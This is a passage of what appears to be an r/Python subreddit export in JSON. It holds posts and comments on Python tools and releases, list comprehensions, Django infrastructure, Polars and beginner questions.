issue\noverview screenshot",
    "comments": []
},
{
    "post_author": "domspage",
    "post_id": "dkhp09",
    "post_score": "1840",
    "post_time": "Sunday, October 20, 2019 at 1:01:55 PM GMT+3",
    "flair_text": "",
    "post_title": "Matplotlib can create plots in the xkcd art style, so you can create plots that look hand drawn.",
    "media": [
        "https://i.redd.it/1mqodd286ot31.png",
        "https://preview.redd.it/1mqodd286ot31.png?width=640&crop=smart&auto=webp&s=d321dec47d98390bfe222e66732af9057e73dc38"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "domspage",
            "score": "67",
            "content": "If anyone is interested, here the code for the graph. Edit: changed the font to Humor Sans"
        },
        {
            "author": "enilkcals",
            "score": "144",
            "content": "The XKCD — Matplotlib 3.1.1 documentation is also a pretty handy reference for doing this."
        },
        {
            "author": "paperbenni",
            "score": "83",
            "content": "Cool, comic sans but it's math"
        },
        {
            "author": "Oxidopamine",
            "score": "16",
            "content": "A new day, yay! r/absolutelynotmeirl"
        },
        {
            "author": "madmendude",
            "score": "55",
            "content": "But...why? Your scientists were so preoccupied with whether or not they could, that they never stopped to think if they should."
        },
        {
            "author": "[deleted]",
            "score": "19",
            "content": "Work starts and work ends need to be reversed wtf whos happy to get to work and sad leaving work. you monsters"
        },
        {
            "author": "jabbalaci",
            "score": "8",
            "content": "What's the name of the font used in this plot?"
        },
        {
            "author": "Almcoding",
            "score": "2",
            "content": "That kicks ass👍"
        },
        {
            "author": "DDFoster96",
            "score": "2",
            "content": "For some reason I can never get this to work"
        }
    ]
},
{
    "post_author": "MichalMietus",
    "post_id": "1c1lgkt",
    "post_score": "3",
    "post_time": "Thursday, April 11, 2024 at 8:53:13 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "JSON to Python - VSCode extension",
    "media": [
        "https://marketplace.visualstudio.com/items?itemName=BringFuture.json-to-python"
    ],
    "post_content": "Hi, I just published my mini extension to VSCode with a command to convert a JSON object file to Python, something I often missed.\nI hope you will find it useful!\nhttps://marketplace.visualstudio.com/items?itemName=BringFuture.json-to-python\nWhat My Project Does: Converts JSON to Python\nTarget Audience: VSCode coders\nComparison: Formatters, etc. I could not find a tool to do exactly that",
    "comments": [
        {
            "author": "TheBoiDec",
            "score": "3",
            "content": "Do you know quicktype? It does this exact thing but for many languages. There is even an extension to vs code called \"paste json as code\"",
            "replies": [
                {
                    "author": "MichalMietus",
                    "score": "1",
                    "content": "I didn't know before, thanks for the recommendation, looks like a great tool. If I understand correctly, they differ in that here, instead of code, data is simply returned in python format - currently only simple types :)"
                }
            ]
        },
        {
            "author": "dparks71",
            "score": "2",
            "content": "Your documentation seems to just be the default template for the vscode extension writing tool you're using, so I have no idea what this tool is supposed to be doing. Is it for copying json and pasting it as a python dict? Is it for loading json as a python object? I use Munch for the second case, I can't think of much I'd use the first for, usually I'm getting json as the response of an http request. Interested to know how it handles the differences between the two formats, like undefined keys in JSON or Python object keys in dicts.",
            "replies": [
                {
                    "author": "MichalMietus",
                    "score": "1",
                    "content": "Thanks for pointing out the README. I've updated and added a usage example. For now, it's just a more convenient version of using `json.loads`, so more complex structures won't be converted, but it's something I thought about doing."
                }
            ]
        },
        {
            "author": "ESloman",
            "score": "1",
            "content": "At the very least I'd recommend updating the README.md to show how it works and some examples. And also why this is easier/better than other alternatives. At the moment, it's still just the default template so the repo and the marketplace listing don't actually tell me anything about this extension.",
            "replies": [
                {
                    "author": "MichalMietus",
                    "score": "1",
                    "content": "Thanks for pointing it out. I have updated the README and added an example of how to use the :)"
                }
            ]
        },
        {
            "author": "pppylonnn",
            "score": "1",
            "content": "Do you mean json to dict? Json to python is an impossible concept",
            "replies": [
                {
                    "author": "MichalMietus",
                    "score": "1",
                    "content": "Hey, maybe the title is too vague. I mean basic JSON types for Python, the command practically calls `json.loads` underneath :)"
                }
            ]
        }
    ]
},
{
    "post_author": "renanengmec",
    "post_id": "1c4rxel",
    "post_score": "6",
    "post_time": "Monday, April 15, 2024 at 8:24:48 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Announcing pixi-kernel - Jupyter kernels using Pixi for reproducible notebooks",
    "media": [
        "https://github.com/renan-r-santos/pixi-kernel",
        "https://pixi.sh/latest/"
    ],
    "post_content": "What My Project Does?\nHello everyone, I'm proud to announce a brand-new Python library named pixi-kernel: https://github.com/renan-r-santos/pixi-kernel allowing you to run Jupyter kernels using Pixi for reproducible notebooks.\nBy the way, if you haven't heard of the Pixi package manager, check it out at https://pixi.sh/latest/.It supports conda and PyPI (through uv) packages, pyproject.toml config, git, path and editable installs and it is really fast.\nTarget Audience\nJupyterLab users, production-ready.\nComparison\nThe main differences compared to similar solutions such as poetry-kernel are the ability to install conda-forge packages and using kernels in languages other than Python. Compared to nb-conda-kernels, the difference is the use of the Pixi package manager which allows per-directory dependency locking.",
    "comments": []
},
{
    "post_author": "lyubolp",
    "post_id": "1c36mvz",
    "post_score": "74",
    "post_time": "Saturday, April 13, 2024 at 8:02:43 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Demystifying list comprehensions in Python",
    "media": [
        "https://lkarev.hashnode.dev/demystifying-list-comprehensions-in-python"
    ],
    "post_content": "In this article, I explain list comprehensions, as this is something people new to Python struggle with.\nDemystifying list comprehensions in Python",
    "comments": [
        {
            "author": "Saddam-inatrix",
            "score": "12",
            "content": "your example for powers is wrong, I think. 64 is also a power of 2. math.isqrt() is not appropriate to for this. Try using log base 2?",
            "replies": [
                {
                    "author": "poetic_fartist",
                    "score": "32",
                    "content": "That's what happens when you use chatgpt to generate content and be too lazy to proof read it. The age of laziness and falsehood ."
                },
                {
                    "author": "lyubolp",
                    "score": "-6",
                    "content": "",
                    "replies": [
                        {
                            "author": "n-of-one",
                            "score": "6",
                            "content": "Maybe you should proofread your AI BS before posting."
                        }
                    ]
                }
            ]
        },
        {
            "author": "marsupiq",
            "score": "22",
            "content": "Looks good! Also I like that you mention the walrus operator, I feel like many people don’t know that it can be used with list comprehensions. I think you should also briefly mention set/dict comprehensions and generator expressions."
        },
        {
            "author": "realitythreek",
            "score": "14",
            "content": "Does anyone feel that list comprehensions are sometimes an antipattern? I habitually reach for them but in many cases it’s more confusing for others to read.",
            "replies": [
                {
                    "author": "FalafelSnorlax",
                    "score": "18",
                    "content": "If they're confusing then you're overdoing it. For simple loops and short conditions, they can be pretty nice, and reduce the amount of lines without losing readability. Once they become unreadable they lose their purpose and you should cut your losses and go back to regular loops"
                },
                {
                    "author": "Ark_Tane",
                    "score": "22",
                    "content": "Coming from other languages I'm really not sold on list comprehensions, I use them for the sake of convention, but give me map and filter functions any day of the week. Mostly just personal preference, although I do find nested comprehensions really difficult to parse."
                },
                {
                    "author": "Eurynom0s",
                    "score": "7",
                    "content": "It depends on how complicated the list comprehension is. [x**2 for x in list] is better and clearer than the for loop equivalent. A nested list comprehension or a list comprehension with something really complicated going on sucks though."
                },
                {
                    "author": "Ouitos",
                    "score": "17",
                    "content": "Nested list comprehension is almost never a good option to me, it's pretty hard to know which is the sub list, which is the element of the sub list. At this point I prefer to use nested for loops where the indentation makes things clearer. Also I grew found of map and filter with time, it's more concise, albeit a bit less like natural language."
                }
            ]
        },
        {
            "author": "joaofelipenp",
            "score": "15",
            "content": "IMO, the best way to demystify list comprehensions is to show a set definition equation. e.g., Even = {2n | n ∈ Z} and show that in Python this would be represented as even = [2 * n for n in integers]",
            "replies": [
                {
                    "author": "Backlists",
                    "score": "50",
                    "content": "As someone who forgot all the maths they ever did, but knows python very well, I find it amusing that you think set notation makes it easier to understand list comps. I see this and think “wow now I can read set notation”."
                }
            ]
        }
    ]
},
{
    "post_author": "the1024",
    "post_id": "1c5lw83",
    "post_score": "34",
    "post_time": "Tuesday, April 16, 2024 at 8:26:52 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "bridge — automatic infrastructure for Django",
    "media": [
        "https://render.com/",
        "https://never-over.github.io/bridge/",
        "https://github.com/Never-Over/bridge",
        "https://flower.readthedocs.io/en/latest/",
        "https://pypi.org/project/python-bridge/"
    ],
    "post_content": "https://github.com/Never-Over/bridge\nThe Problem\nWe built bridge to solve the most frustrating part of any new project — infrastructure. Whenever you spin up a new Django project, you usually have to manually configure Postgres, background workers, a task queue, and more. The problem is amplified when you go to deploy your application — hosting providers don’t understand anything about what you’ve configured already, so you have to run through an even more complicated process to set up the same infrastructure in a deployed environment.\nWhat My Project Does\nbridge is a pip-installable package that spins up all of the infrastructure you need, and automatically connects it to your Django project. By adding a single line to your Django project's settings.py file, bridge configures everything for you — this means you don’t need to mess with DATABASES, BROKER_URL, or other environment variables to connect to these services.\nbridge also gives you the access you need to manage these services, including a database and Redis shell, as well as a Flower instance for monitoring background tasks.\nWhen you’re ready to deploy, bridge can handle that as well. By running bridge init render, bridge will write all of the configuration necessary to deploy your application on Render, including a button to trigger deploys straight from your README.\nIf you don’t want all of these services, (say you already have a database, and just want to add background workers) bridge supports that too! It can automate everything you need and nothing you don’t.\nTarget Audience\nThis tool is intended for Django developers who are getting new projects off the ground.\nComparison\nCompared to how Django functions on its own, bridge abstracts and manages all of the services you'd need to manually set up and configure.\nCompared to other boilerplate or starter pack repos, bridge is more lightweight and doesn't force you to change your application code. It is focused only on handling all of the required dependencies, startup, and teardown of your infrastructure.\nHow it Works\nbridge is built on top of Docker, so you get fully isolated and up-to-date versions of Postgres and Redis from the beginning. Celery and Flower need to run on top of your app code, so we hook into runserver to spin these up as background processes. If you need to spin things down, bridge stop will conveniently shut down all services that it’s started.\nComing Soon\nIn the future, we want to add support for more services (jupyter, mail/mailhog etc), more hosting providers (Heroku, Railway, etc.), and more configuration (env vars, optional dependencies, etc).\nbridge is and always will be fully open source. Please give it a try and we’d love any feedback!\nGithub\nDocs\nPyPI",
    "comments": [
        {
            "author": "Shakakai",
            "score": "4",
            "content": "This is an excellent idea.",
            "replies": [
                {
                    "author": "the1024",
                    "score": "1",
                    "content": "Thanks u/Shakakai! We’d love if you give it a try"
                }
            ]
        },
        {
            "author": "ChimpanzeChapado",
            "score": "1",
            "content": "Sounds pretty interesting. I'll take a look ASAP. Thanks for sharing it!",
            "replies": [
                {
                    "author": "the1024",
                    "score": "1",
                    "content": "u/ChimpanzeChapado appreciate it! Let us know if you have any feedback :)"
                }
            ]
        },
        {
            "author": "_HariSeldon_",
            "score": "1",
            "content": "Sounds Interesting! will take a look!",
            "replies": [
                {
                    "author": "the1024",
                    "score": "1",
                    "content": "Thanks! Would love any feedback 🙏"
                }
            ]
        }
    ]
},
{
    "post_author": "RRTheGuy",
    "post_id": "1c4qclz",
    "post_score": "7",
    "post_time": "Monday, April 15, 2024 at 7:21:08 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "motsmeles - word search generator",
    "media": [
        "https://github.com/RadoTheProgrammer/motsmeles/"
    ],
    "post_content": "https://github.com/RadoTheProgrammer/motsmeles/\nNote: This is written in french.\nWhat my project does\nIt generate word search games with custom words, dimensions.\nTarget audience\nFor people who want to get fun with some word searching\nComparison\nThis is a python library, it's open source, and you can use it in a python code, or with the command-line.\nAlso, you have freedom if you want to have diagonal or reversed words.\nNext steps\nA GUI with pygame to generate and use it in a user-friendly interface.",
    "comments": [
        {
            "author": "stevenjd",
            "score": "1",
            "content": "Numpy and Pandas are dependencies? That's pretty heavy for something that is as simple as a word-search and requires no heavy maths.",
            "replies": [
                {
                    "author": "RRTheGuy",
                    "score": "1",
                    "content": "I use numpy for storing the grid and pandas to print answers and save it in a csv Also, I want to get started into data sciences"
                }
            ]
        },
        {
            "author": "Puzzleheaded_Bill271",
            "score": "1",
            "content": "You would really benefit from a code linter and formatter to make your code look nicer and to catch some bugs. I like ruff, but tools like pylint and black are also good. Things to look into : the modules pathlib, and string This code is very nested, which makes it very difficult to read.",
            "replies": [
                {
                    "author": "RRTheGuy",
                    "score": "1",
                    "content": "Thx for your feedback! In my history I tried using pylint but I really disliked it, it display lot of errors for ... nothing, now i'm trying flake8. For the modules pathlib, why specifically do I need it? Can't I just use open() Indeed, you're completely right when you tell that my code is very nested, which make me a lot of line too long issues, maybe that I should divide everything into functions. You really helped me a lot for your feedback, may i propose you to contribute to this project ?"
                }
            ]
        },
        {
            "author": "CarpenterLeather7691",
            "score": "-1",
            "content": "Bruh, no one cares",
            "replies": [
                {
                    "author": "AndydeCleyre",
                    "score": "1",
                    "content": "False. But I don't speak French, which presents a barrier to use."
                }
            ]
        }
    ]
},
{
    "post_author": "thrum-engineering",
    "post_id": "f04cjn",
    "post_score": "1834",
    "post_time": "Friday, February 7, 2020 at 6:16:42 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "This website has a searchable database of python modules shown as collapsible trees",
    "media": [
        "https://preview.redd.it/n36mj38z5ff41.gif?width=640&crop=smart&format=png8&s=a17df33ab3e9caea74b4ad4cbe181822a632eaea"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "thrum-engineering",
            "score": "89",
            "content": "Source: https://www.thrum.engineering/python-module-dependency-trees",
            "replies": [
                {
                    "author": "CbVdD",
                    "score": "24",
                    "content": "Thanks for this. Very helpful."
                },
                {
                    "author": "Yakhov",
                    "score": "4",
                    "content": "cool tool! my only suggestion would be to use a darker background color for the site and tree. That white is blinding me. or at least use a font color that doesn't disappear when I invert it. thanks!",
                    "replies": [
                        {
                            "author": "thrum-engineering",
                            "score": "3",
                            "content": "Hi! Thanks for this suggestion!"
                        }
                    ]
                },
                {
                    "author": "wellimjustyouknow",
                    "score": "1",
                    "content": "Is the source code available?",
                    "replies": [
                        {
                            "author": "GSG44",
                            "score": "1",
                            "content": "It uses d3.js and json data. You can see how here: https://bl.ocks.org/d3noob/43a860bc0024792f8803bba8ca0d5ecd"
                        }
                    ]
                }
            ]
        },
        {
            "author": "dougthor42",
            "score": "26",
            "content": "How are you determining what a project's dependencies are? Just looking at setup.py's install_requies? Checking requirements.txt? Can dev requirements also be shown? Very cool, btw."
        },
        {
            "author": "donnaber06",
            "score": "45",
            "content": "This is bad ass. I just jumped into python after 4 years out of the industry."
        },
        {
            "author": "knobToucher",
            "score": "9",
            "content": "This is really cool! Thanks :)"
        },
        {
            "author": "-El_Chapo-",
            "score": "9",
            "content": "Anyone know what UI library this is using to display the data?"
        },
        {
            "author": "abhi_uno",
            "score": "4",
            "content": "I just search my library. But it's old: Last Updated: Wed Jul 24 2019 Any plans of updating caches?"
        },
        {
            "author": "watch____",
            "score": "6",
            "content": "This is great! Maybe you could also add licenses?"
        },
        {
            "author": "Dheeraj_Perumandla",
            "score": "2",
            "content": "Cool one"
        },
        {
            "author": "abdelrahmanhosny",
            "score": "2",
            "content": "Cool! Thanks"
        }
    ]
},
{
    "post_author": "chinawcswing",
    "post_id": "1c0lhz8",
    "post_score": "223",
    "post_time": "Wednesday, April 10, 2024 at 4:24:07 PM GMT+3",
    "flair_text": "News",
    "post_title": "Python 3.12.3 Released",
    "media": [
        "https://www.python.org/downloads/release/python-3123/"
    ],
    "post_content": "https://www.python.org/downloads/release/python-3123/\n3.12.3 is the latest maintenance release, containing more than 300 bugfixes, build improvements and documentation changes since 3.12.2.",
    "comments": [
        {
            "author": "chub79",
            "score": "125",
            "content": "Congratulations to the maintainers and people who have contributed! What a time for Python :)"
        },
        {
            "author": "LightShadow",
            "score": "33",
            "content": "One day closer to getting off 3.11.8! Great job!!",
            "replies": [
                {
                    "author": "ComfortableFig9642",
                    "score": "44",
                    "content": "Bro we run 3.10 across most of our prod services and I feel like that's already pretty good as far as staying current. And y'all are out here making me feel like we're lagging behind!",
                    "replies": [
                        {
                            "author": "LightShadow",
                            "score": "14",
                            "content": "My heaviest service is on 3.9 until I'm ready to redo a bunch of C bindings :) A few jobs ago we were hardware capped to 3.5, we're pretty lucky to be near the newest these days haha"
                        },
                        {
                            "author": "not_invented_here",
                            "score": "3",
                            "content": "You guys got me thinking that tomorrow I will try to rebuild a service using python 3.10 with 3.12. Maybe I get some performance gains cheaply. (it's a dashboard and I don't want to mess too much with it)",
                            "replies": [
                                {
                                    "author": "moosethemucha",
                                    "score": "4",
                                    "content": "I envy your optimism - it will probably be fine - or you'll spend 12 hours debugging a dependency issue/API change"
                                }
                            ]
                        },
                        {
                            "author": "Amgadoz",
                            "score": "2",
                            "content": "Same. I prefer to use the default python version on Ubuntu 22.04.03 LTS as this means code can run on most vms",
                            "replies": [
                                {
                                    "author": "ComfortableFig9642",
                                    "score": "3",
                                    "content": "Past a certain scale (like, established startup scale -- I'm not even talking about enterprise) you'll be containerizing everything, at which point it stops being a concern. Sure, k8s isn't really worthwhile until you can get large, but containerization itself is much more than k8s, and using something like ECS isn't actually much more complex than whatever custom deployment process was being done otherwise. But I concede there is a certain level of simplification inherent in working with whatever your hardware supports out of the box. No need to add yet another tool to the toolbox if what you have works just fine. And Docker can't be used absolutely everywhere (particularly with lower-level stuff and a lot of situations where you can't do Docker-in-Docker), so it has limits as well."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "24kvolt",
                    "score": "9",
                    "content": "Sorry, can you explain that? Why 3.11.8 specifically?"
                }
            ]
        },
        {
            "author": "dan-turkel",
            "score": "31",
            "content": "I love reading the deprecation section and seeing system libraries that I've never ever heard of before."
        },
        {
            "author": "mlody11",
            "score": "8",
            "content": "Reusing quotes in f string, F yes!! Edit: I know .12 allowed it... I'm just excited, still."
        },
        {
            "author": "nikonguy",
            "score": "3",
            "content": "Maybe my program will run right now. But... probably not. :-)"
        },
        {
            "author": "CamronB143",
            "score": "2",
            "content": "When will Anaconda have this release available?"
        },
        {
            "author": "russellvt",
            "score": "1",
            "content": "GDI... I lazily pushed 3.12.2 out through all my pyenv just earlier this week! LOL"
        },
        {
            "author": "RevolutionaryRain941",
            "score": "1",
            "content": "Hope python grows the same as it is doing now."
        }
    ]
},
{
    "post_author": "Ro0t-set",
    "post_id": "g6tiih",
    "post_score": "1751",
    "post_time": "Thursday, April 23, 2020 at 10:49:33 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made this clock using python and as GUI html, css, JS",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Frogbeerr",
            "score": "368",
            "content": "I cringe at the off-centered hands",
            "replies": [
                {
                    "author": "Shakaka88",
                    "score": "65",
                    "content": "That’s all I see",
                    "replies": [
                        {
                            "author": "beep_check",
                            "score": "64",
                            "content": "OP did say CSS... so..."
                        }
                    ]
                },
                {
                    "author": "tov_net",
                    "score": "28",
                    "content": "I almost didn't notice 😓",
                    "replies": [
                        {
                            "author": "TheRealFanjin",
                            "score": "14",
                            "content": "I actually didn't notice"
                        },
                        {
                            "author": "maxhosted",
                            "score": "1",
                            "content": "It was the first thing I saw"
                        }
                    ]
                },
                {
                    "author": "onequbit",
                    "score": "6",
                    "content": "\"Art is what you can get away with.\" ~ Andy Warhol"
                },
                {
                    "author": "callmelucky",
                    "score": "8",
                    "content": "The dot in the \"centre\" is off-centre on the clock face too (too far right). This is a fucking nighmare :D"
                },
                {
                    "author": "ds-unraid",
                    "score": "3",
                    "content": "This is why there are coders and ux designers. I think the functionality is great, person did a good job.",
                    "replies": [
                        {
                            "author": "maniakh",
                            "score": "3",
                            "content": "C'mon man you don't have to be a UX expert to center a dot. Like, that's too much LOL. Anyway, OP did do a good job on the functionality."
                        }
                    ]
                },
                {
                    "author": "Shivam_RawatOxox",
                    "score": "-2",
                    "content": "my ocd kicking in"
                }
            ]
        },
        {
            "author": "Fissherin",
            "score": "39",
            "content": "What is python 's purpose here? What is it doing? Html css and js are doing the front. Is it acting as a local server?"
        },
        {
            "author": "Ro0t-set",
            "score": "72",
            "content": "I know, the layout is not responsive ... the front end is boring This is a very simple example of how to use Eel to create a python GUI using web scripts (html, css, js) ... In this case it would have been easier to do everything in javascript, but I wanted to have fun with this library"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "Nice job!"
        },
        {
            "author": "nabiladnan99",
            "score": "5",
            "content": "Nice work!"
        },
        {
            "author": "seizonnokamen",
            "score": "5",
            "content": "This is so cool! I love the design! Good job!"
        },
        {
            "author": "_blub",
            "score": "11",
            "content": "I don’t see where python needs to be here. just stick with vanilla HTML, JS, and CSS."
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "I think that's pretty cool"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Awesome 😍"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Brython bro!"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c5vh3q",
    "post_score": "6",
    "post_time": "Wednesday, April 17, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Spikeestocking",
            "score": "1",
            "content": "So I have a term test for university coming up and I'm quite weak in python overall, but could someone please explain how While loops, For loops, and nested loops work? I watched tutorials on it but I still can't seem to grasp how it actually works. (For me I prefer to understand the process behind how things work to actually grasp the concept of whatever I'm learning.) Sorry for the wall of text and thank you to whoever in advance :)",
            "replies": [
                {
                    "author": "StoryRadiant1919",
                    "score": "3",
                    "content": "try writing the code for a simple loop of each type and running it. Then come back here with your code and any questions and I bet you’ll get help. There are hundreds of resources to copy for this."
                }
            ]
        },
        {
            "author": "xxkillquickxx",
            "score": "1",
            "content": "YouTube always mentions that python is good for ai and machine learning. I do school and sports portraits so I have a need to crop and straighten thousands of images. Would learning python allow me to create a tool to crop images for me? Thanks in advance!",
            "replies": [
                {
                    "author": "riklaunim",
                    "score": "4",
                    "content": "Depends on your skills and capabilities as there is a difference between learning Python/other language syntax and basics versus actually using it to write more complex software that does some tasks. Like learning Python is super easy versus writing code that will actually perform the crop/edit of the images ;) Simple crops don't need AI as it can be done with PIL and image file editing. Not sure what and how you want to \"straighten\" the images."
                }
            ]
        },
        {
            "author": "geomontgomery",
            "score": "1",
            "content": "I read somewhere that using global vars is bad, and I should at least attempt to make most of my code in functions with arguments applied. Most of my projects include pandas dataframes in vscode, and I like to use the # %% line sep that tells vscode to run jupyter code blocks. When I work without any globals, or having all my functions not return anything, I can't really inspect the pandas frame in jupyter because no df is getting returned. Just curious - anyone have some best practices to share about setting up pandas projects in vscode in general?"
        },
        {
            "author": "tjdwill",
            "score": "1",
            "content": "If you are familiar with the C API, did you find it worth learning? How did your understanding and use of the language change?"
        }
    ]
},
{
    "post_author": "JamesHutchisonReal",
    "post_id": "1c4r9ha",
    "post_score": "6",
    "post_time": "Monday, April 15, 2024 at 7:58:04 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Heavy Stack - Top to Bottom Python, Dev Container, Hot Reloading, More",
    "media": [
        "https://github.com/heavy-resume/heavy-stack"
    ],
    "post_content": "Trying this again a third time because automod flagged it as a resource and the mods do not appear to be responding.https://github.com/heavy-resume/heavy-stack\nWhat it does: The Heavy Stack is a template web framework that is top to bottom Python using Sanic / (custom) ReactPy / Brython. It's a complete solution that just works out of the box.\nTarget Audience: This is production capable but a little on the early side. Iterating is quite fast.\nComparison:\nCompared to other web frameworks:\nJust works out of the box, even has a docker image ready to go for the server and your postgres database that uses PG Vector.\nReactPy is server side, so instead of creating API calls, you just use `heavy_use_effect` and `heavy_event` to respond to things, do async loads, etc. It uses a websocket. If you're familiar with ReactPy already, the difference is that there's `heavy` versions that inject a database connection to the async functions and let you stuff in user context.\nThe custom version of ReactPy that ships with this reconnects the websocket and attempts to restore the client state. It also supports recording and replaying your actions and uses locust to do load testing with those actions.\nHot reloading means if you change a code file you see your changes about 2 seconds after saving without having to refresh the page. For tests it means the test runs near instantly after the initial load.\nDescription:\nThis is a dev container / GitHub Codespaces centric repo, so you'll be best served by using VS Code and either codespaces or something compatible the dev container standard. It's intended to be a template repo which you just run a script to rename to whatever project you want.\nHere are the features that work \"out of the box\" if you use the dev container or codespace:\nPre-made dev container, docker files\nTop to Bottom Python (Sanic, custom ReactPy, Brython)\nPostgreSQL, PG Vector, CockroachDB\nSQL Model (SQLAlchemy + Pydantic)\nHot reloading, both server and tests\nUser action recording and playback for load testing\nTime tracking based on file changes\nEstablished patterns and examples, script to generate boilerplate around tables and their domain models\nThere's some known issues and planned updates that will come at a later time, so for the sake of not overselling it, this should be treated like an alpha product. I'd love to see contributions though, especially when it comes to creating off-the-shelf components for ReactPy, or fixing the ReactPy bugs or getting that massive ReactPy PR mentioned in the readme piece-wise merged into the main project.\nThanks for your time! I hope this is helpful for some people!",
    "comments": [
        {
            "author": "fortunatefaileur",
            "score": "1",
            "content": "Out of interest, have you ever used a “stack” or “template” like this that someone else wrote? Rather than eg a generated “pylons” ot “zc” or whatever skeleton. I’ve been programming for an extremely long time and have never done so or spoken to anyone who has done so. Is it common? For what sort of projects? That said, it is good to have trivial examples published for people to copy paste from, so thanks.",
            "replies": [
                {
                    "author": "JamesHutchisonReal",
                    "score": "2",
                    "content": "Internally at companies you would have service templates that saves people from setting up all the boilerplate and keeps them aligned with standards. So this is like that, but not internal. This is not remotely trivial."
                }
            ]
        }
    ]
},
{
    "post_author": "raman_mad",
    "post_id": "a58rmr",
    "post_score": "1832",
    "post_time": "Tuesday, December 11, 2018 at 8:16:18 PM GMT+3",
    "flair_text": "",
    "post_title": "We are not alone!",
    "media": [
        "https://preview.redd.it/dlofi6femo321.jpg?width=640&crop=smart&auto=webp&s=9507a182e592a6ee01cd267a1ae821735d25bc8c",
        "https://i.redd.it/dlofi6femo321.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "403",
            "content": "I also like this tweet from one of the creators of Django: I can only write Django apps while closely consulting the documentation, _much of which I wrote!_ Consulting docs/google/etc isn't a failure; it's literally what professional software development actually looks like. https://twitter.com/jacobian/status/988515858887491584",
            "replies": [
                {
                    "author": "grantrules",
                    "score": "172",
                    "content": "Right? Good luck figuring out how to deploy your app that's been rotting in your GitHub for two years without even minimal documentation."
                }
            ]
        },
        {
            "author": "szechuan_steve",
            "score": "139",
            "content": "Something that made me more comfortable in my own programmer skin was realizing a long time ago that geniuses still have struggles, get frustrated, feel inadequate, forget, learn, and make mistakes. The difference is, a genius keeps going, keeps leaning, admits to - and learns from mistakes. Failure is an opportunity to be used, not feared. All that hard work and frustration is not for nothing if you keep going when things get hard. Even geniuses start at nothing."
        },
        {
            "author": "saulmessedupman",
            "score": "65",
            "content": "I call help() on my own API all the time. God bless docstrings."
        },
        {
            "author": "brtt3000",
            "score": "50",
            "content": "Also important for senior devs: don't solve your juniors problems if it is a documented thing. Asking people is too easy, instead teach how to find things for themselves, how to read documentation and find what you need. Fish, fishing rod, yadiyada."
        }
    ]
},
{
    "post_author": "EngiNerd9000",
    "post_id": "1c3e8ac",
    "post_score": "21",
    "post_time": "Sunday, April 14, 2024 at 1:37:42 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Using Polars to Write Multiple LazyFrames to Delta from One Source File",
    "media": [],
    "post_content": "I'm working on an ETL job that reads in a JSONL file, splits it into multiple Polars LazyFrames, collects those to DataFrames, and then writes them to a Delta Table. Prior to doing this with Polars, I would generally complete a task like this with either Pandas or PySpark depending on the size of data I was dealing with. I'm looking for any suggestions or advice the community has on doing this as efficiently as possible using Polars.",
    "comments": [
        {
            "author": "ambidextrousalpaca",
            "score": "7",
            "content": "The polars streaming API is awesome. When it's working well, it gives you the speed and capacity of pyspark without the startup costs. That said, you need to bear in mind that (unlike the regular polar dataframe API, which is about to go 1.0) it is still very much a work in progress. That means that: It does not have the full feature set of the regular dataframes, e.g. you can get a not implemented error if you try some complex grouping logic across tables. There will be some bugs, e.g. I found one with count method a few weeks ago (the guys on the polars team were great and merged and released the fix I suggested within a few hours, all on a Sunday https://github.com/pola-rs/polars/issues/14956) - so make sure you test your code thoroughly and let the polars team know if you find any issues. This isn't battle tested code which has been in production for years. Based on my testing, the polars streaming API still uses large amounts of memory to process files (I think this is because there is at least as much focus on optimising for speed as there is for memory usage in the API) - meaning that it is often only barely true that it allows you to process larger than memory files. As you've discovered, the documentation is still wanting. Honestly, the best thing I've found with it is to go directly to the Rust docs and look at the source code at https://docs.rs/polars/latest/polars/prelude/struct.LazyFrame.html In your case, I would really just use some simple and efficient *nix utility like split to divide your input files and then run polars on them sequentially. If your data is pretty regular, polar will automatically derive the schema from a small sample of the first n rows in any case, which is efficient. Alternatively, you could just provide it with an explicit schema yourself: https://docs.pola.rs/user-guide/lazy/schemas/",
            "replies": [
                {
                    "author": "EngiNerd9000",
                    "score": "2",
                    "content": "Thanks for the advice! I definitely didn't know about the divide between DataFrames and LazyFrames in maturity, but like you said, it makes sense based on the level of detail in the docs. I think right now I was hoping to use a LazyFrame more for the other optimizations it offers (specifically the common subplan elimination). And yeah I'm already using a defined schema. I find it's very necessary for my use case. Inferring a schema can be fine, until you build out a data model based on an inferred schema where an object has always been coming in as null and then it is eventually populated. I'll probably do a little bit of experimenting between running everything as a LazyFrame, a DataFrame, and some combination to \"cache\" common operations."
                }
            ]
        },
        {
            "author": "EngiNerd9000",
            "score": "3",
            "content": "To clarify, the JSON data I’m reading is being split out into entities for a relational DB. So, for instance, say I use the unnest operation to flatten the data so that my top level entity is flat, plus a List column containing a Struct which would represent a child entity. Well I can select that column and the primary keys from my top level entity and explode the list column and set that as a separate LazyFrame. I would assume that if I ran separate writes to Delta Tables, even though they are LazyFrames, there would still be repeated operations? In PySpark I can cache each DataFrame prior to splitting it out to the next entity to cut down on repeated operations in theory. Wondering if there is something similar here? (Maybe I just need to collect it into a DataFrame and then create another LazyFrame off of that?) Are there other efficiencies to be found?"
        },
        {
            "author": "cmcclu5",
            "score": "2",
